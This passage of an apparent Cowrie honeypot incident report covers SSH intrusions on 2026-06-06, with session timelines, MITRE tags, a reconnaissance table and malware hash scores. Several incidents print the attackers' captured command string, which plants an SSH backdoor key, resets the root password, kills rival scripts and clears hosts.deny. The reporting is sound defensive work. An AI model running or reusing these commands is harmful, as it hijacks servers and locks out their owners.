| `2026-06-06 12:06:20` | `cowrie.log.closed` |
| `2026-06-06 12:06:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.75.198[.]228` to AbuseIPDB if not already reported
- [ ] Block `103.75.198[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a1cdf895d49

| Field | Detail |
|---|---|
| **Source IP** | `103.75.198[.]228` |
| **First Seen** | 2026-06-06 12:06 |
| **Last Seen** | 2026-06-06 12:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 12:06:23` | `cowrie.session.connect` |
| `2026-06-06 12:06:23` | `cowrie.client.version` |
| `2026-06-06 12:06:23` | `cowrie.client.kex` |
| `2026-06-06 12:06:24` | `cowrie.login.success` |
| `2026-06-06 12:06:24` | `cowrie.session.params` |
| `2026-06-06 12:06:24` | `cowrie.command.input` |
| `2026-06-06 12:06:24` | `cowrie.log.closed` |
| `2026-06-06 12:06:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.75.198[.]228` to AbuseIPDB if not already reported
- [ ] Block `103.75.198[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2442c43c09f0

| Field | Detail |
|---|---|
| **Source IP** | `103.75.198[.]228` |
| **First Seen** | 2026-06-06 12:06 |
| **Last Seen** | 2026-06-06 12:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 12:06:28` | `cowrie.session.connect` |
| `2026-06-06 12:06:28` | `cowrie.client.version` |
| `2026-06-06 12:06:28` | `cowrie.client.kex` |
| `2026-06-06 12:06:28` | `cowrie.login.success` |
| `2026-06-06 12:06:29` | `cowrie.session.params` |
| `2026-06-06 12:06:29` | `cowrie.command.input` |
| `2026-06-06 12:06:29` | `cowrie.log.closed` |
| `2026-06-06 12:06:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.75.198[.]228` to AbuseIPDB if not already reported
- [ ] Block `103.75.198[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd62de0fa7ab

| Field | Detail |
|---|---|
| **Source IP** | `103.75.198[.]228` |
| **First Seen** | 2026-06-06 12:06 |
| **Last Seen** | 2026-06-06 12:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 12:06:33` | `cowrie.session.connect` |
| `2026-06-06 12:06:33` | `cowrie.client.version` |
| `2026-06-06 12:06:33` | `cowrie.client.kex` |
| `2026-06-06 12:06:33` | `cowrie.login.success` |
| `2026-06-06 12:06:33` | `cowrie.session.params` |
| `2026-06-06 12:06:33` | `cowrie.command.input` |
| `2026-06-06 12:06:34` | `cowrie.log.closed` |
| `2026-06-06 12:06:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.75.198[.]228` to AbuseIPDB if not already reported
- [ ] Block `103.75.198[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-152f36e8803c

| Field | Detail |
|---|---|
| **Source IP** | `103.75.198[.]228` |
| **First Seen** | 2026-06-06 12:08 |
| **Last Seen** | 2026-06-06 12:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 12:08:03` | `cowrie.session.connect` |
| `2026-06-06 12:08:03` | `cowrie.client.version` |
| `2026-06-06 12:08:03` | `cowrie.client.kex` |
| `2026-06-06 12:08:03` | `cowrie.login.success` |
| `2026-06-06 12:08:04` | `cowrie.session.params` |
| `2026-06-06 12:08:04` | `cowrie.command.input` |
| `2026-06-06 12:08:04` | `cowrie.log.closed` |
| `2026-06-06 12:08:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.75.198[.]228` to AbuseIPDB if not already reported
- [ ] Block `103.75.198[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc76bd17f15d

| Field | Detail |
|---|---|
| **Source IP** | `115.190.27[.]28` |
| **First Seen** | 2026-06-06 13:27 |
| **Last Seen** | 2026-06-06 13:28 |
| **Session Duration** | 26s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:OLwVBQuH4tMo"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 13:27:34` | `cowrie.session.connect` |
| `2026-06-06 13:27:34` | `cowrie.client.version` |
| `2026-06-06 13:27:34` | `cowrie.client.kex` |
| `2026-06-06 13:27:34` | `cowrie.login.success` |
| `2026-06-06 13:27:35` | `cowrie.session.params` |
| `2026-06-06 13:27:35` | `cowrie.command.input` |
| `2026-06-06 13:27:35` | `cowrie.command.failed` |
| `2026-06-06 13:27:35` | `cowrie.log.closed` |
| `2026-06-06 13:27:36` | `cowrie.session.params` |
| `2026-06-06 13:27:36` | `cowrie.command.input` |
| `2026-06-06 13:27:36` | `cowrie.session.file_download` |
| `2026-06-06 13:27:36` | `cowrie.log.closed` |
| `2026-06-06 13:27:50` | `cowrie.session.params` |
| `2026-06-06 13:27:50` | `cowrie.command.input` |
| `2026-06-06 13:27:50` | `cowrie.log.closed` |
| `2026-06-06 13:27:51` | `cowrie.session.params` |
| `2026-06-06 13:27:51` | `cowrie.command.input` |
| `2026-06-06 13:27:51` | `cowrie.log.closed` |
| `2026-06-06 13:27:52` | `cowrie.session.params` |
| `2026-06-06 13:27:52` | `cowrie.command.input` |
| `2026-06-06 13:27:52` | `cowrie.session.file_download` |
| `2026-06-06 13:27:52` | `cowrie.log.closed` |
| `2026-06-06 13:27:52` | `cowrie.session.params` |
| `2026-06-06 13:27:52` | `cowrie.command.input` |
| `2026-06-06 13:27:53` | `cowrie.log.closed` |
| `2026-06-06 13:27:54` | `cowrie.session.params` |
| `2026-06-06 13:27:54` | `cowrie.command.input` |
| `2026-06-06 13:27:54` | `cowrie.log.closed` |
| `2026-06-06 13:27:55` | `cowrie.session.params` |
| `2026-06-06 13:27:55` | `cowrie.command.input` |
| `2026-06-06 13:27:55` | `cowrie.command.input` |
| `2026-06-06 13:27:55` | `cowrie.log.closed` |
| `2026-06-06 13:27:55` | `cowrie.session.params` |
| `2026-06-06 13:27:55` | `cowrie.command.input` |
| `2026-06-06 13:27:55` | `cowrie.log.closed` |
| `2026-06-06 13:27:55` | `cowrie.session.params` |
| `2026-06-06 13:27:55` | `cowrie.command.input` |
| `2026-06-06 13:27:56` | `cowrie.log.closed` |
| `2026-06-06 13:27:56` | `cowrie.session.params` |
| `2026-06-06 13:27:56` | `cowrie.command.input` |
| `2026-06-06 13:27:56` | `cowrie.log.closed` |
| `2026-06-06 13:27:56` | `cowrie.session.params` |
| `2026-06-06 13:27:56` | `cowrie.command.input` |
| `2026-06-06 13:27:57` | `cowrie.log.closed` |
| `2026-06-06 13:27:57` | `cowrie.session.params` |
| `2026-06-06 13:27:57` | `cowrie.command.input` |
| `2026-06-06 13:27:57` | `cowrie.log.closed` |
| `2026-06-06 13:27:58` | `cowrie.session.params` |
| `2026-06-06 13:27:58` | `cowrie.command.input` |
| `2026-06-06 13:27:58` | `cowrie.log.closed` |
| `2026-06-06 13:27:58` | `cowrie.session.params` |
| `2026-06-06 13:27:58` | `cowrie.command.input` |
| `2026-06-06 13:27:58` | `cowrie.log.closed` |
| `2026-06-06 13:27:59` | `cowrie.session.params` |
| `2026-06-06 13:27:59` | `cowrie.command.input` |
| `2026-06-06 13:27:59` | `cowrie.log.closed` |
| `2026-06-06 13:27:59` | `cowrie.session.params` |
| `2026-06-06 13:27:59` | `cowrie.command.input` |
| `2026-06-06 13:28:00` | `cowrie.log.closed` |
| `2026-06-06 13:28:00` | `cowrie.session.params` |
| `2026-06-06 13:28:00` | `cowrie.command.input` |
| `2026-06-06 13:28:00` | `cowrie.log.closed` |
| `2026-06-06 13:28:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.190.27[.]28` to AbuseIPDB if not already reported
- [ ] Block `115.190.27[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b50bf2f0ba4c

| Field | Detail |
|---|---|
| **Source IP** | `115.190.27[.]28` |
| **First Seen** | 2026-06-06 13:29 |
| **Last Seen** | 2026-06-06 13:29 |
| **Session Duration** | 29s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:2PG28nzXTLF4"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 13:29:11` | `cowrie.session.connect` |
| `2026-06-06 13:29:11` | `cowrie.client.version` |
| `2026-06-06 13:29:12` | `cowrie.client.kex` |
| `2026-06-06 13:29:13` | `cowrie.login.success` |
| `2026-06-06 13:29:14` | `cowrie.session.params` |
| `2026-06-06 13:29:14` | `cowrie.command.input` |
| `2026-06-06 13:29:14` | `cowrie.command.failed` |
| `2026-06-06 13:29:14` | `cowrie.log.closed` |
| `2026-06-06 13:29:16` | `cowrie.session.params` |
| `2026-06-06 13:29:16` | `cowrie.command.input` |
| `2026-06-06 13:29:16` | `cowrie.session.file_download` |
| `2026-06-06 13:29:16` | `cowrie.log.closed` |
| `2026-06-06 13:29:29` | `cowrie.session.params` |
| `2026-06-06 13:29:29` | `cowrie.command.input` |
| `2026-06-06 13:29:29` | `cowrie.log.closed` |
| `2026-06-06 13:29:29` | `cowrie.session.params` |
| `2026-06-06 13:29:29` | `cowrie.command.input` |
| `2026-06-06 13:29:30` | `cowrie.log.closed` |
| `2026-06-06 13:29:31` | `cowrie.session.params` |
| `2026-06-06 13:29:31` | `cowrie.command.input` |
| `2026-06-06 13:29:31` | `cowrie.session.file_download` |
| `2026-06-06 13:29:31` | `cowrie.log.closed` |
| `2026-06-06 13:29:31` | `cowrie.session.params` |
| `2026-06-06 13:29:31` | `cowrie.command.input` |
| `2026-06-06 13:29:31` | `cowrie.log.closed` |
| `2026-06-06 13:29:32` | `cowrie.session.params` |
| `2026-06-06 13:29:32` | `cowrie.command.input` |
| `2026-06-06 13:29:33` | `cowrie.log.closed` |
| `2026-06-06 13:29:33` | `cowrie.session.params` |
| `2026-06-06 13:29:33` | `cowrie.command.input` |
| `2026-06-06 13:29:33` | `cowrie.command.input` |
| `2026-06-06 13:29:33` | `cowrie.log.closed` |
| `2026-06-06 13:29:34` | `cowrie.session.params` |
| `2026-06-06 13:29:34` | `cowrie.command.input` |
| `2026-06-06 13:29:34` | `cowrie.log.closed` |
| `2026-06-06 13:29:34` | `cowrie.session.params` |
| `2026-06-06 13:29:34` | `cowrie.command.input` |
| `2026-06-06 13:29:34` | `cowrie.log.closed` |
| `2026-06-06 13:29:35` | `cowrie.session.params` |
| `2026-06-06 13:29:35` | `cowrie.command.input` |
| `2026-06-06 13:29:35` | `cowrie.log.closed` |
| `2026-06-06 13:29:36` | `cowrie.session.params` |
| `2026-06-06 13:29:36` | `cowrie.command.input` |
| `2026-06-06 13:29:36` | `cowrie.log.closed` |
| `2026-06-06 13:29:36` | `cowrie.session.params` |
| `2026-06-06 13:29:36` | `cowrie.command.input` |
| `2026-06-06 13:29:36` | `cowrie.log.closed` |
| `2026-06-06 13:29:37` | `cowrie.session.params` |
| `2026-06-06 13:29:37` | `cowrie.command.input` |
| `2026-06-06 13:29:37` | `cowrie.log.closed` |
| `2026-06-06 13:29:37` | `cowrie.session.params` |
| `2026-06-06 13:29:37` | `cowrie.command.input` |
| `2026-06-06 13:29:37` | `cowrie.log.closed` |
| `2026-06-06 13:29:38` | `cowrie.session.params` |
| `2026-06-06 13:29:38` | `cowrie.command.input` |
| `2026-06-06 13:29:38` | `cowrie.log.closed` |
| `2026-06-06 13:29:39` | `cowrie.session.params` |
| `2026-06-06 13:29:39` | `cowrie.command.input` |
| `2026-06-06 13:29:39` | `cowrie.log.closed` |
| `2026-06-06 13:29:40` | `cowrie.session.params` |
| `2026-06-06 13:29:40` | `cowrie.command.input` |
| `2026-06-06 13:29:41` | `cowrie.log.closed` |
| `2026-06-06 13:29:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.190.27[.]28` to AbuseIPDB if not already reported
- [ ] Block `115.190.27[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-64e5e0d3b35e

| Field | Detail |
|---|---|
| **Source IP** | `115.190.27[.]28` |
| **First Seen** | 2026-06-06 13:40 |
| **Last Seen** | 2026-06-06 13:40 |
| **Session Duration** | 25s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:4LuIwymGX4Sa"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 13:40:34` | `cowrie.session.connect` |
| `2026-06-06 13:40:34` | `cowrie.client.version` |
| `2026-06-06 13:40:34` | `cowrie.client.kex` |
| `2026-06-06 13:40:34` | `cowrie.login.success` |
| `2026-06-06 13:40:35` | `cowrie.session.params` |
| `2026-06-06 13:40:35` | `cowrie.command.input` |
| `2026-06-06 13:40:35` | `cowrie.command.failed` |
| `2026-06-06 13:40:35` | `cowrie.log.closed` |
| `2026-06-06 13:40:36` | `cowrie.session.params` |
| `2026-06-06 13:40:36` | `cowrie.command.input` |
| `2026-06-06 13:40:37` | `cowrie.session.file_download` |
| `2026-06-06 13:40:37` | `cowrie.log.closed` |
| `2026-06-06 13:40:49` | `cowrie.session.params` |
| `2026-06-06 13:40:49` | `cowrie.command.input` |
| `2026-06-06 13:40:49` | `cowrie.log.closed` |
| `2026-06-06 13:40:50` | `cowrie.session.params` |
| `2026-06-06 13:40:50` | `cowrie.command.input` |
| `2026-06-06 13:40:50` | `cowrie.log.closed` |
| `2026-06-06 13:40:50` | `cowrie.session.params` |
| `2026-06-06 13:40:50` | `cowrie.command.input` |
| `2026-06-06 13:40:51` | `cowrie.session.file_download` |
| `2026-06-06 13:40:51` | `cowrie.log.closed` |
| `2026-06-06 13:40:51` | `cowrie.session.params` |
| `2026-06-06 13:40:51` | `cowrie.command.input` |
| `2026-06-06 13:40:51` | `cowrie.log.closed` |
| `2026-06-06 13:40:52` | `cowrie.session.params` |
| `2026-06-06 13:40:52` | `cowrie.command.input` |
| `2026-06-06 13:40:52` | `cowrie.log.closed` |
| `2026-06-06 13:40:52` | `cowrie.session.params` |
| `2026-06-06 13:40:52` | `cowrie.command.input` |
| `2026-06-06 13:40:52` | `cowrie.command.input` |
| `2026-06-06 13:40:53` | `cowrie.log.closed` |
| `2026-06-06 13:40:53` | `cowrie.session.params` |
| `2026-06-06 13:40:53` | `cowrie.command.input` |
| `2026-06-06 13:40:53` | `cowrie.log.closed` |
| `2026-06-06 13:40:54` | `cowrie.session.params` |
| `2026-06-06 13:40:54` | `cowrie.command.input` |
| `2026-06-06 13:40:54` | `cowrie.log.closed` |
| `2026-06-06 13:40:54` | `cowrie.session.params` |
| `2026-06-06 13:40:54` | `cowrie.command.input` |
| `2026-06-06 13:40:55` | `cowrie.log.closed` |
| `2026-06-06 13:40:55` | `cowrie.session.params` |
| `2026-06-06 13:40:55` | `cowrie.command.input` |
| `2026-06-06 13:40:55` | `cowrie.log.closed` |
| `2026-06-06 13:40:56` | `cowrie.session.params` |
| `2026-06-06 13:40:56` | `cowrie.command.input` |
| `2026-06-06 13:40:56` | `cowrie.log.closed` |
| `2026-06-06 13:40:56` | `cowrie.session.params` |
| `2026-06-06 13:40:56` | `cowrie.command.input` |
| `2026-06-06 13:40:56` | `cowrie.log.closed` |
| `2026-06-06 13:40:58` | `cowrie.session.params` |
| `2026-06-06 13:40:58` | `cowrie.command.input` |
| `2026-06-06 13:40:58` | `cowrie.log.closed` |
| `2026-06-06 13:40:58` | `cowrie.session.params` |
| `2026-06-06 13:40:58` | `cowrie.command.input` |
| `2026-06-06 13:40:58` | `cowrie.log.closed` |
| `2026-06-06 13:40:59` | `cowrie.session.params` |
| `2026-06-06 13:40:59` | `cowrie.command.input` |
| `2026-06-06 13:40:59` | `cowrie.log.closed` |
| `2026-06-06 13:40:59` | `cowrie.session.params` |
| `2026-06-06 13:40:59` | `cowrie.command.input` |
| `2026-06-06 13:40:59` | `cowrie.log.closed` |
| `2026-06-06 13:40:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.190.27[.]28` to AbuseIPDB if not already reported
- [ ] Block `115.190.27[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `103.75.198[.]228` | **49** | 2026-06-06 11:58 | 2026-06-06 12:08 | 0m | 48 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `101.100.194[.]181` | **30** | 2026-06-06 10:10 | 2026-06-06 11:02 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `141.109.168[.]149` | **30** | 2026-06-06 10:19 | 2026-06-06 11:12 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `103.173.7[.]218` | **25** | 2026-06-06 12:51 | 2026-06-06 12:56 | 5m | 0 | `T1592` | 🟠 MEDIUM |
| `115.190.27[.]28` | **19** | 2026-06-06 13:24 | 2026-06-06 13:49 | 30m | 3 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `167.99.119[.]225` | **6** | 2026-06-06 10:45 | 2026-06-06 13:37 | 4m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]188` | **3** | 2026-06-06 12:36 | 2026-06-06 12:37 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.65.194[.]27` | **2** | 2026-06-06 11:29 | 2026-06-06 11:29 | 0m | 0 | `T1592` | 🟢 LOW |
| `3.129.73[.]98` | **2** | 2026-06-06 10:55 | 2026-06-06 10:59 | 0m | 0 | `T1592` | 🟢 LOW |
| `3.145.168[.]146` | **2** | 2026-06-06 11:36 | 2026-06-06 11:41 | 0m | 0 | `T1592` | 🟢 LOW |
| `106.105.209[.]240` | 1 | 2026-06-06 11:43 | 2026-06-06 11:44 | 30s | 0 | `T1592` | 🟢 LOW |
| `120.48.60[.]44` | 1 | 2026-06-06 11:04 | 2026-06-06 11:06 | 120s | 0 | `T1592` | 🟢 LOW |
| `183.220.38[.]154` | 1 | 2026-06-06 12:06 | 2026-06-06 12:08 | 120s | 0 | `T1592` | 🟢 LOW |
| `20.55.15[.]3` | 1 | 2026-06-06 13:50 | 2026-06-06 13:50 | 0s | 0 | `T1592` | 🟢 LOW |
| `49.247.36[.]49` | 1 | 2026-06-06 11:00 | 2026-06-06 11:00 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `54.91.130[.]222` | 1 | 2026-06-06 13:11 | 2026-06-06 13:11 | 0s | 0 | `T1592` | 🟢 LOW |
| `61.171.110[.]253` | 1 | 2026-06-06 10:14 | 2026-06-06 10:16 | 120s | 0 | `T1592` | 🟢 LOW |
| `64.62.156[.]80` | 1 | 2026-06-06 11:40 | 2026-06-06 11:40 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]65` | 1 | 2026-06-06 12:33 | 2026-06-06 12:33 | 16s | 0 | `T1592` | 🟢 LOW |
| `68.151.1[.]196` | 1 | 2026-06-06 12:29 | 2026-06-06 12:29 | 14s | 0 | `T1592` | 🟢 LOW |
| `69.5.169[.]231` | 1 | 2026-06-06 12:16 | 2026-06-06 12:16 | 9s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (32 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0d3d2e513043f33923c8538f0d40b246730eb64d685628c28b89b04b6efcabf3` | ELF Binary (Linux executable) (x86-64 64-bit) | `0d3d2e513043f339...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `235596e7fb00cc04e95c500b5d02891e4b5d5ee54d063553a62c93b6bbd3eb9a` | ELF Binary (Linux executable) (ARM 32-bit) | `235596e7fb00cc04...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `321bfd80417496f99f32183c73d0a46b42900a8ae9d87b4079740b9297bc3cb4` | ELF Binary (Linux executable) (ARM 32-bit) | `321bfd80417496f9...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
